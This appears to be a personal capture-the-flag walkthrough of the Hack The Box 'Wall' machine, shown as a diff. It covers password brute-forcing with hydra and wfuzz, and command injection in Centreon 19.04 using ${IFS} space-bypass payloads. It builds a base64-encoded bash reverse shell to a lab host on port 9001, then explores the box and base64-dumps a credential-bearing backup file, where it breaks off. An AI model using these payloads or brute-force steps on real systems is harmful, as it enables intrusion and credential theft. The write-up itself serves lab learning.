@@ -1,0 +1,977 @@
+Wall - Hack The Box - Medium Linux - Static Analysis
+
+Ports open: 22 80
+
+Running gobuster, could speicfy -x php but no idea what language webserver is so we don't bother with exceptions
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $gobuster dir -u http://10.10.10.157/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o root-web.log
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.157/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/05/13 18:12:49 Starting gobuster in directory enumeration mode
+===============================================================
+/monitoring           (Status: 401) [Size: 459]
+====================================================================================================================================
+
+Status 401 mean http auth required.
+
+Will use hydra to brute force the http auth
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $hydra -l admin -P /opt/SecLists/Passwords/darkweb2017-top1000.txt -f 10.10.10.157 http-get /monitoring
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-13 18:17:28
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 999 login tries (l:1/p:999), ~63 tries per task
+[DATA] attacking http-get://10.10.10.157:80/monitoring
+====================================================================================================================================
+
+We start burp in order to do something while hydra is running. We go to /monitoring and are asked fro cred, we turn on burp and the 
+proxy and when we change the request method to be a POST we get a 301 saying "/monitoring" has been moved. We get another get request
+and change it again to a POST and this time around we get the following 301 message:
+"<meta http-equiv="refresh" content="0; URL='/centreon'" />"
+
+So we go to "/centreon"
+We go that page and are given another login page. we get the following version for the software
+Commands and Output:
+====================================================================================================================================
+ Centreon Logo
+Login: * 	
+Password * 	
+© Centreon 2005 - 2019
+v. 19.04.0
+====================================================================================================================================
+
+We can look for the "centreon changelog"
+https://docs.centreon.com/docs/centreon/en/19.04/release_notes/centreon-19.04/
+
+We look at version 19.04.0:
+https://docs.centreon.com/docs/centreon/en/19.04/release_notes/centreon-19.04/centreon-19.04.0.html
+And we find various security fixes
+Commands and Output:
+====================================================================================================================================
+
+Security fixes
+
+    Authenticated RCE in minPlayCommand.php (PR/#7232)
+
+    SQL injections in the service by hostgroups and servicegroups pages (PR/#7267)
+
+    Allow to set illegal characters for centcore (PR/#7206 PR/#7287)
+
+    Token generation uses predictable generator
+
+    Authenticated SQL injection in makeXML_ListServices.php
+
+    SQL Injection in serviceGridByHGXML.php
+
+====================================================================================================================================
+
+We can look for more using searchsploit
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $searchsploit centreon
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Centreon - SQL Injection / Command Injection (Metasploit)                                               | unix/remote/35078.rb
+Centreon 1.4.2.3 - 'get_image.php' Remote File Disclosure                                               | php/webapps/5204.py
+Centreon 1.4.2.3 - 'index.php' Local File Inclusion                                                     | php/webapps/31318.txt
+Centreon 19.04 - Authenticated Remote Code Execution (Metasploit)                                       | php/webapps/47948.rb
+Centreon 19.04 - Remote Code Execution                                                                  | php/webapps/47069.py
+Centreon 19.10.5 - 'centreontrapd' Remote Command Execution                                             | php/webapps/47978.txt
+Centreon 19.10.5 - 'id' SQL Injection                                                                   | php/webapps/48345.txt
+Centreon 19.10.5 - 'Pollers' Remote Command Execution                                                   | php/webapps/47977.txt
+Centreon 19.10.5 - 'Pollers' Remote Command Execution (Metasploit)                                      | php/webapps/47994.rb
+Centreon 19.10.5 - Database Credentials Disclosure                                                      | php/webapps/47968.txt
+Centreon 19.10.5 - Remote Command Execution                                                             | php/webapps/47969.txt
+Centreon 2.3.1 - 'command_name' Remote Command Execution                                                | php/webapps/36293.txt
+Centreon 2.5.3 - Remote Command Execution                                                               | php/webapps/39501.txt
+Centreon 2.5.3 - Web Useralias Command Execution (Metasploit)                                           | python/remote/40170.rb
+Centreon 2.5.4 - Multiple Vulnerabilities                                                               | php/webapps/37528.txt
+Centreon 2.6.1 - Multiple Vulnerabilities                                                               | php/webapps/38339.txt
+Centreon < 2.5.1 / Centreon Enterprise Server < 2.2 - SQL Injection / Command Injection (Metasploit)    | linux/webapps/41676.rb
+Centreon Enterprise Server 2.3.3 < 2.3.9-4 - Blind SQL Injection                                        | php/webapps/23362.py
+Centreon IT & Network Monitoring 2.1.5 - SQL Injection                                                  | php/webapps/11979.pl
+Oreon 1.4 / Centreon 1.4.1 - Multiple Remote File Inclusion Vulnerabilities                             | php/webapps/4735.txt
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+====================================================================================================================================
+
+Most exploits are authenticated.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $searchsploit -x php/webapps/47069.py
+  Exploit: Centreon 19.04 - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/47069
+     Path: /usr/share/exploitdb/exploits/php/webapps/47069.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+====================================================================================================================================
+
+Still needs a username and password to work. We may need to run another bruteforce against this.
+Will use burp to further analyze. The request looks as follows
+Commands and Output:
+====================================================================================================================================
+POST /centreon/index.php HTTP/1.1
+Host: 10.10.10.157
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 98
+Origin: http://10.10.10.157
+DNT: 1
+Connection: close
+Referer: http://10.10.10.157/centreon/
+Cookie: PHPSESSID=mqfoe2qt295imsdgqfau0igp7h
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+useralias=admin&password=admin&submitLogin=Connect&centreon_token=185e38555dca0a9535eb7ef6074cd46f
+====================================================================================================================================
+
+We can see a csrf token, if we want to brute force we need our python script to include this. The sense machine includes code on 
+how to do this. This only happens with cross site scripting attacks not really brute forcing.
+
+Another way to get through this small issue is to look  and see if there is a centreon API for logins.
+Cross site scripting do not happen with API's
+
+We google: centeon api login
+https://docs.centreon.com/docs/centreon/en/19.04/api/api_rest/
+
+
+Commands and Output:
+====================================================================================================================================
+api.domain.tld/centreon/api/index.php?action=authenticate
+
+Body form-data:
+Parameter
+Type
+Value
+username
+
+Text
+The user name you use to login on Centreon
+password
+Text
+Your Centreon password
+====================================================================================================================================
+
+We will use curl to test the API
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $curl 10.10.10.157/centreon/api/index.php?action=authenticate -d 'username=admin&password=admin'
+"Bad credentials"
+====================================================================================================================================
+
+We try a different name
+Commands and Output:
+====================================================================================================================================
+└──╼ $curl 10.10.10.157/centreon/api/index.php?action=authenticate -d 'username=adminasd&password=admin'
+"Bad credentials"
+====================================================================================================================================
+
+It does not distinguish if user is wrong. Just bad creds.
+We can look a burp and see the tme it take sto do the request. We change the requestmethod.
+Commands and Output:
+====================================================================================================================================
+POST /centreon/api/index.php?action=authenticate HTTP/1.1
+Host: 10.10.10.157
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+username=admin&password=admin
+
+
+RESPONSE:
+HTTP/1.1 403 Forbidden
+Server: Apache/2.4.29 (Ubuntu)
+Content-Length: 17
+Connection: close
+Content-Type: application/json;charset=utf-8
+
+"Bad credentials"
+====================================================================================================================================
+
+The timing is between 80 and a 100 milliseconds.
+Also same size 197 bytes.
+
+Can't validate valid usernames so we will guess the default username as admin, we could also google centreon's default creds
+Commands and Output:
+====================================================================================================================================
+https://www.tenable.com › plugins › nessus
+Dec 23, 2014 — The remote Centreon install uses a default set of credentials ('admin' / 'centreon') to control access to its management interface.
+====================================================================================================================================
+
+admin / centreon
+
+We try those creds, but nothing.
+Commands and Output:
+====================================================================================================================================
+└──╼ $curl 10.10.10.157/centreon/api/index.php?action=authenticate -d 'username=admin&password=centreon'
+"Bad credentials"
+====================================================================================================================================
+
+We can now try to brute force with wfuzz
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $wfuzz -u http://10.10.10.157/centreon/api/index.php?action=authenticate -d 'username=admin&password=FUZZ' -w /opt/SecLists/Passwords/darkweb2017-top1000.txt 
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.157/centreon/api/index.php?action=authenticate
+Total requests: 999
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                  
+=====================================================================
+
+000000001:   403        0 L      2 W        17 Ch       "123456"                                                                 
+000000015:   403        0 L      2 W        17 Ch       "1q2w3e4r5t"                                                             
+000000018:   403        0 L      2 W        17 Ch       "qwertyuiop"                                                             
+000000017:   403        0 L      2 W        17 Ch       "123456a"                                                                
+000000014:   403        0 L      2 W        17 Ch       "iloveyou"                                                               
+000000016:   403        0 L      2 W        17 Ch       "1234"                                                                   
+000000013:   403        0 L      2 W        17 Ch       "12345"                                                                  
+000000012:   403        0 L      2 W        17 Ch       "000000"                                                                 
+000000003:   403        0 L      2 W        17 Ch       "111111"                                                                 
+000000007:   403        0 L      2 W        17 Ch       "12345678"                                                               
+000000011:   403        0 L      2 W        17 Ch       "1234567890"                                                             
+000000010:   403        0 L      2 W        17 Ch       "123123"                                                                 
+000000004:   403        0 L      2 W        17 Ch       "password"                                                               
+000000008:   200        0 L      1 W        60 Ch       "password1"                                                              
+000000025:   403        0 L      2 W        17 Ch       "myspace1"                                                               
+000000033:   403        0 L      2 W        17 Ch       "gwerty"                                                                 
+000000032:   403        0 L      2 W        17 Ch       "target123"      
+====================================================================================================================================
+
+We get a bunch of 403's so we want to hide those Responses. we use the "--hc" option
+
+Commands and Output:
+====================================================================================================================================
+wfuzz -u http://10.10.10.157/centreon/api/index.php?action=authenticate -d 'username=admin&password=FUZZ' -w /opt/SecLists/Passwords/darkweb2017-top1000.txt --hc 403
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.157/centreon/api/index.php?action=authenticate
+Total requests: 999
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                  
+=====================================================================
+
+000000008:   200        0 L      1 W        61 Ch       "password1"
+====================================================================================================================================
+
+
+"password1" we get a 200 request. We can now try logging in with that password.
+We can test it with the API
+Commands and Output:
+====================================================================================================================================
+└──╼ $curl 10.10.10.157/centreon/api/index.php?action=authenticate -d 'username=admin&password=password1'
+{"authToken":"9EbrlMsqxRfGdk224R\/TYTKLIWnBceaCFLGuQS7P2xc="}
+====================================================================================================================================
+
+And what we get is an auth token to use as the admin. 
+
+At this point we have to look at which authenticated rce we want to use.
+
+We look at the different versions of centreon and look for cve's.
+
+We look at 19.04.03
+https://docs.centreon.com/docs/centreon/en/19.04/release_notes/centreon-19.04/centreon-19.04.3.html
+Commands and Output:
+====================================================================================================================================
+Security fixes
+    [UI] add escapeshellarg to nagios_bin binary passed to shell_exec (#7694 closes CVE-2019-13024)
+====================================================================================================================================
+
+We get a github page with the exploit.
+https://github.com/mhaskar/CVE-2019-13024/blob/master/Centreon-exploit.py
+
+If we go to the centreon configure pollers, command injection.
+We modify the "Monitoring Engine Binary" field and do the debug option. It will execute the binary, can run any binary.
+"/usr/sbin/centronnagios"
+Trying simple commands such as "ip addr", "ps"
+We don't get any error with "ps"
+
+There seems to be issues with spaces.
+
+For "ps" we can now save and click on export configuration and export while making sure to add "central" as the poller.
+
+Do not forget to add ";" this is done since we might be injecting into the middle of a command so it will work better.
+
+If we wanted to test for blind command execution we can test with ping.
+
+Commands and Output:
+====================================================================================================================================
+ping -c 1 10.10.14.18;
+====================================================================================================================================
+
+We still get 403 errors, this happens when adding spaces. Will try echo test. 2 ways with dealing with space.
+
+Commands and Output:
+====================================================================================================================================
+echo${IFS}test
+====================================================================================================================================
+
+By default internal field separator is "space" bash will translate it to a " ".
+
+Also bash will auto exapnd brackets like the following:
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ ${echo,test}
+test
+====================================================================================================================================
+
+Using brackets will work in most cases since it is very bash specific. So we can do the following with ping.
+Commands and Output:
+====================================================================================================================================
+{ping,-c,1,10.10.14.18}
+====================================================================================================================================
+
+We try it but get the following:
+Commands and Output:
+====================================================================================================================================
+[ - ] Central
+sh: 1: {ping,-c,1,10.10.14.18}: not found
+====================================================================================================================================
+
+Not found by sh so we can try the IFS way.
+Commands and Output:
+====================================================================================================================================
+ping${IFS}-c${IFS}1${IFS}10.10.14.18;
+====================================================================================================================================
+
+And we get a response back
+Commands and Output:
+====================================================================================================================================
+└──╼ $sudo tcpdump -i tun0 icmp -n
+[sudo] password for user: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+20:34:57.881402 IP 10.10.10.157 > 10.10.14.18: ICMP echo request, id 21790, seq 1, length 64
+20:34:57.881415 IP 10.10.14.18 > 10.10.10.157: ICMP echo reply, id 21790, seq 1, length 64
+====================================================================================================================================
+
+We didn't run a semi colon at the end so we can try it again.
+
+Commands and Output:
+====================================================================================================================================
+{ping,-c,1,10.10.14.18};
+
+ERROR:
+[ - ] Central
+sh: 1: -v: not found
+====================================================================================================================================
+
+We still get errors so we just go ahead and use the IFS version of running commands.
+
+Now we need to get a reverse shell.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.18/9001 0>&1'" | sed 's/ /\$\{IFS\}/g'
+bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/10.10.14.18/9001${IFS}0>&1'
+====================================================================================================================================
+
+We tried running it but it fails. We try the mdofied command on the command line but get the following
+
+Commands and Output:
+====================================================================================================================================
+└──╼ $bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/10.10.14.18/9001${IFS}0>&1'
+bash: line 1: ${IFS}/dev/tcp/10.10.14.18/9001${IFS}0: ambiguous redirect
+====================================================================================================================================
+
+So instead we will have to place it in an encoding that doesn't have spaces to begin with, so we will base64 the normal bash string.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.18/9001 0>&1'" | base64 
+YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjEn
+====================================================================================================================================
+
+After that we will base64 deocde the command and do bash on it.
+Commands and Output:
+====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.18/9001 0>&1'" | base64 | base64 -d | bash
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.18/9001 0>&1' | base64 | base64 -d | bash"| sed 's/ /\$\{IFS\}/g'
+bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/10.10.14.18/9001${IFS}0>&1'${IFS}|${IFS}base64${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash
+====================================================================================================================================
+
+Actually we jumped the gun you need the base encoded string so it can be parsed without the IFS
+And we try adding to the binary exec path on the pollers
+
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.18/9001 0>&1'" | base64 
+YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjEn
+
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $echo "echo -n 'YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjEn' | base64 -d | bash" |sed 's/ /\$\{IFS\}/g'
+echo${IFS}-n${IFS}'YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjEn'${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash
+
+====================================================================================================================================
+
+It does not work so we can try instead removing the 'bash -c' portion that might be interfering with command execution.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $echo -n "bash -i >& /dev/tcp/10.10.14.18/9001 0>&1" | base64 
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjE=
+
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $echo "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjE= | base64 -d | bash" | sed 's/ /\$\{IFS\}/g'
+echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjE=${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash
+
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+[ - ] Central
+###################################################################
+# #
+# GENERATED BY CENTREON #
+# #
+# Developped by : #
+# - Julien Mathis #
+# - Romain Le Merlus #
+# #
+# www.centreon.com #
+..
+..
+<< SNIP >>
+..
+..
+cfg_file=/usr/local/centreon//filesGeneration/engine/1/servicegroups.cfg
+cfg_file=/usr/local/centreon//filesGeneration/engine/1/timeperiods.cfg
+cfg_file=/usr/local/centreon//filesGeneration/engine/1/escalations.cfg
+cfg_file=/usr/local/centreon//filesGeneration/engine/1/dependencies.cfg
+use_aggressive_host_checking=1
+soft_state_dependencies=0
+obsess_over_services=0
+process_performance_data=0
+check_for_orphaned_services=0
+check_for_orphaned_hosts=0
+check_service_freshness=1
+enable_flap_detection=0
+/usr/local/centreon/filesGeneration/engine/1/centengine.DEBUG: line 65: unexpected EOF while looking for matching ``'
+/usr/local/centreon/filesGeneration/engine/1/centengine.DEBUG: line 96: syntax Error unexpected end of file
+====================================================================================================================================
+
+We still do not get the reverse shell connection back but after further examination we see that we forgot to add the ";" at the 
+end which is why the command is not completeing so lets try that.
+WORKING!!!
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjE=${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;
+====================================================================================================================================
+
+AND we get our connection back after adding the semi-colon to the "Monitroing Engine Binary" saving, "EXPORT Configuration", 
+Selecting "Central" as the poller and clicking "export"
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.10.10.157] 58306
+bash: cannot set terminal process group (981): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@Wall:/usr/local/centreon/www$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)
+www-data@Wall:/usr/local/centreon/www$
+====================================================================================================================================
+
+There are 2 users but can't cat the user.txt
+Commands and Output:
+====================================================================================================================================
+www-data@Wall:/home$ cd /home
+www-data@Wall:/home$ ls -la
+total 16
+drwxr-xr-x  4 root       root       4096 Jul  4  2019 .
+drwxr-xr-x 23 root       root       4096 Jul  4  2019 ..
+drwxr-xr-x  6 shelby     shelby     4096 Jul 30  2019 shelby
+drwxr-xr-x  5 sysmonitor sysmonitor 4096 Jul  6  2019 sysmonitor
+====================================================================================================================================
+
+We can take a look at shelby's files and notice the active dates.
+Commands and Output:
+====================================================================================================================================
+www-data@Wall:/home/shelby$ ls -la
+total 48
+drwxr-xr-x 6 shelby shelby 4096 Jul 30  2019 .
+drwxr-xr-x 4 root   root   4096 Jul  4  2019 ..
+lrwxrwxrwx 1 root   root      9 Jul  6  2019 .bash_history -> /dev/null
+-rw-r--r-- 1 shelby shelby  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 shelby shelby 3771 Apr  4  2018 .bashrc
+drwx------ 2 shelby shelby 4096 Jul  4  2019 .cache
+drwx------ 3 shelby shelby 4096 Jul  4  2019 .gnupg
+drwxrwxr-x 3 shelby shelby 4096 Jul  4  2019 .local
+-rw-r--r-- 1 shelby shelby  807 Apr  4  2018 .profile
+drwxr-xr-x 2 shelby shelby 4096 Jul  4  2019 .rpmdb
+-rw-rw-r-- 1 shelby shelby 4567 Jul 30  2019 html.zip
+-rw------- 1 shelby shelby   33 May 14 04:01 user.txt
+====================================================================================================================================
+
+We know the user was active between July 4th and July 30th.
+We can use a find command to find all the files modified between those 2 dates.
+Commands and Output:
+====================================================================================================================================
+www-data@Wall:/home/shelby$ find / -type f -newermt 2019-07-03 ! -newermt 2019-07-30 2>/dev/null
+/share/man/man1/screen.1
+/share/screen/utf8encodings/19
+/share/screen/utf8encodings/c6
+/share/screen/utf8encodings/a1
+/share/screen/utf8encodings/c2
+/share/screen/utf8encodings/04
+/share/screen/utf8encodings/02
+/share/screen/utf8encodings/cc
+/share/screen/utf8encodings/c4
+/share/screen/utf8encodings/c3
+/share/screen/utf8encodings/d6
+/share/screen/utf8encodings/bf
+/share/screen/utf8encodings/c7
+/share/screen/utf8encodings/03
+/share/screen/utf8encodings/cd
+/share/screen/utf8encodings/01
+/share/screen/utf8encodings/18
+/share/screen/utf8encodings/c8
+/bin/screen-4.5.0
+/etc/subuid
+/etc/modsecurity/modsecurity.conf
+/etc/passwd
+/etc/group-
+/etc/subgid
+/etc/gshadow-
+/home/sysmonitor/.wget-hsts
+/home/shelby/.rpmdb/Group
+/home/shelby/.rpmdb/__db.001
+/home/shelby/.rpmdb/Requirename
+/home/shelby/.rpmdb/__db.003
+/home/shelby/.rpmdb/Transfiletriggername
+/home/shelby/.rpmdb/Suggestname
+/home/shelby/.rpmdb/Supplementname
+/home/shelby/.rpmdb/__db.002
+/home/shelby/.rpmdb/Sigmd5
+/home/shelby/.rpmdb/Recommendname
+/home/shelby/.rpmdb/.dbenv.lock
+/home/shelby/.rpmdb/Filetriggername
+/home/shelby/.rpmdb/Providename
+/home/shelby/.rpmdb/Dirnames
+/home/shelby/.rpmdb/Basenames
+/home/shelby/.rpmdb/Obsoletename
+/home/shelby/.rpmdb/Packages
+/home/shelby/.rpmdb/Sha1header
+/home/shelby/.rpmdb/Enhancename
+/home/shelby/.rpmdb/Conflictname
+/home/shelby/.rpmdb/Triggername
+/home/shelby/.rpmdb/Name
+/home/shelby/.rpmdb/Installtid
+/var/log/tallylog
+/var/log/mail.log.2.gz
+/var/log/journal/5ca9d3bc21b247cabe18d8a99153a010/system@00058d015a591704-0ae734f4b30b3296.journal~
+/var/log/journal/5ca9d3bc21b247cabe18d8a99153a010/system@00058cc909922d0a-39614318d3cd154e.journal~
+/var/log/journal/5ca9d3bc21b247cabe18d8a99153a010/system@00058ccd77c4884c-9bbc06a60db972f1.journal~
+/var/log/faillog
+/var/log/mail.err.2.gz
+/var/www/html/panel.php
+/var/www/html/monitoring/index.html
+/var/backups/alternatives.tar.0
+/var/backups/passwd.bak
+====================================================================================================================================
+
+We find a /var/backups file. But that is exclusive to root so instead we append readable as an option to make sure we can view items
+We also add one more day to te date to get more files
+Commands and Output:
+====================================================================================================================================
+find / -type f -newermt 2019-07-03 ! -newermt 2019-07-31 -readable -ls 2>/dev/null 
+====================================================================================================================================
+
+We get a lot of output detailing dist-packages so inverse grep the files containing that path name
+Commands and Output:
+====================================================================================================================================
+find / -type f -newermt 2019-07-03 ! -newermt 2019-07-31 -readable -ls 2>/dev/null | grep -v dist-packages
+..
+..
+..
+   275056      4 -rw-r--r--   1 root     root         1168 Jul 30  2019 /opt/.shelby/backup
+   788648    160 -rw-r--r--   1 root     root       163442 Jul  4  2019 /share/man/man1/screen.1
+   788636     96 -rw-r--r--   1 root     root        95776 Jul  4  2019 /share/screen/utf8encodings/19
+   788642      4 -rw-r--r--   1 root     root           68 Jul  4  2019 /share/screen/utf8encodings/c6
+   788637      4 -rw-r--r--   1 root     root          536 Jul  4  2019 /share/screen/utf8encodings/a1
+   788639      4 -rw-r--r--   1 root     root          256 Jul  4  2019 /share/screen/utf8encodings/c2
+   788634     24 -rw-r--r--   1 root     root        24302 Jul  4  2019 /share/screen/utf8encodings/04
+   788632     28 -rw-r--r--   1 root     root        27550 Jul  4  2019 /share/screen/utf8encodings/02
+   788645      4 -rw-r--r--   1 root     root           68 Jul  4  2019 /share/screen/utf8encodings/cc
+..
+..
+..
+====================================================================================================================================
+
+We find an interestng backups file in /opt for shelby
+Commands and Output:
+====================================================================================================================================
+www-data@Wall:/opt/.shelby$ cd /opt/
+www-data@Wall:/opt$ ls -la
+total 12
+drwxr-xr-x  3 root root 4096 Jul  4  2019 .
+drwxr-xr-x 23 root root 4096 Jul  4  2019 ..
+drwxr-xr-x  2 root root 4096 Jul 30  2019 .shelby
+www-data@Wall:/opt$ cd .shelby/
+www-data@Wall:/opt/.shelby$ ls
+backup
+www-data@Wall:/opt/.shelby$ file backup 
+backup: python 2.7 byte-compiled
+====================================================================================================================================
+
+Using the file binary we see that its a python 2.7 compiled file so can use uncompyle from python packages to decomyple the binary.
+We can transfer the file to our local machine simply by using base64 encode
+Commands and Output:
+====================================================================================================================================
+www-data@Wall:/opt/.shelby$ cat backup | base64
+A/MNCl5WQF1jAAAAAAAAAAAFAAAAQAAAAHN0AgAAZAAAZAEAbAAAWgAAZAIAWgEAZAMAWgIAZAQA
+WgMAZQAAagQAZQIAZQMAZgIAgwEAWgUAZAUAWgYAZQYAZQcAZQgAZAYAgwEAgwEAN1oGAGUGAGUH
+AGUIAGQHAIMBAIMBADdaBgBlBgBlBwBlCABkCACDAQCDAQA3WgYAZQYAZQcAZQgAZAkAgwEAgwEA
+N1oGAGUGAGUHAGUIAGQKAIMBAIMBADdaBgBlBgBlBwBlCABkCwCDAQCDAQA3WgYAZQYAZQcAZQgA
+ZAwAgwEAgwEAN1oGAGUGAGUHAGUIAGQNAIMBAIMBADdaBgBlBgBlBwBlCABkDgCDAQCDAQA3WgYA
+ZQYAZQcAZQgAZA4AgwEAgwEAN1oGAGUGAGUHAGUIAGQPAIMBAIMBADdaBgBlBgBlBwBlCABkEACD
+AQCDAQA3WgYAZQYAZQcAZQgAZBEAgwEAgwEAN1oGAGUGAGUHAGUIAGQSAIMBAIMBADdaBgBlBgBl
+BwBlCABkEwCDAQCDAQA3WgYAZQYAZQcAZQgAZA4AgwEAgwEAN1oGAGUGAGUHAGUIAGQGAIMBAIMB
+ADdaBgBlBgBlBwBlCABkFACDAQCDAQA3WgYAZQYAZQcAZQgAZBEAgwEAgwEAN1oGAGUGAGUHAGUI
+AGQVAIMBAIMBADdaBgBlBgBlBwBlCABkFgCDAQCDAQA3WgYAZQYAZQcAZQgAZBcAgwEAgwEAN1oG
+AGUGAGUHAGUIAGQYAIMBAIMBADdaBgBlBQBqCQBkGQBlAQBkGgBlBgCDAAIBZQAAagoAagsAZQUA
+gwEAWgwAZQwAag0AZBsAZBwAgwIAAWQdAEdIZAEAUygeAAAAaf////9OdAYAAABzaGVsYnlzCAAA
+AHdhbGwuaHRiaRYAAAB0AAAAAHQBAAAAU3QBAAAAaHQBAAAAZXQBAAAAbHQBAAAAYnQBAAAAeXQB
+AAAAUHQBAAAAYXQBAAAAc3QBAAAAd3QBAAAAQHQBAAAAcnQBAAAAZHQBAAAASXQBAAAAdHQBAAAA
+b3QBAAAAbnQBAAAAZ3QBAAAAIXQIAAAAdXNlcm5hbWV0CAAAAHBhc3N3b3JkcxEAAAAvdmFyL3d3
+dy9odG1sLnppcHMIAAAAaHRtbC56aXBzCgAAAFsrXSBEb25lICEoDgAAAHQIAAAAcGFyYW1pa29S
+FQAAAHQEAAAAaG9zdHQEAAAAcG9ydHQJAAAAVHJhbnNwb3J0dAkAAAB0cmFuc3BvcnRSFgAAAHQD
+AAAAY2hydAMAAABvcmR0BwAAAGNvbm5lY3R0CgAAAFNGVFBDbGllbnR0DgAAAGZyb21fdHJhbnNw
+b3J0dAsAAABzZnRwX2NsaWVudHQDAAAAcHV0KAAAAAAoAAAAACgAAAAAcwkAAABiYWNrdXAucHl0
+CAAAADxtb2R1bGU+BAAAAHNAAAAADAIGAgYBBgIVAgYBFgEWARYBFgEWARYBFgEWARYBFgEWARYB
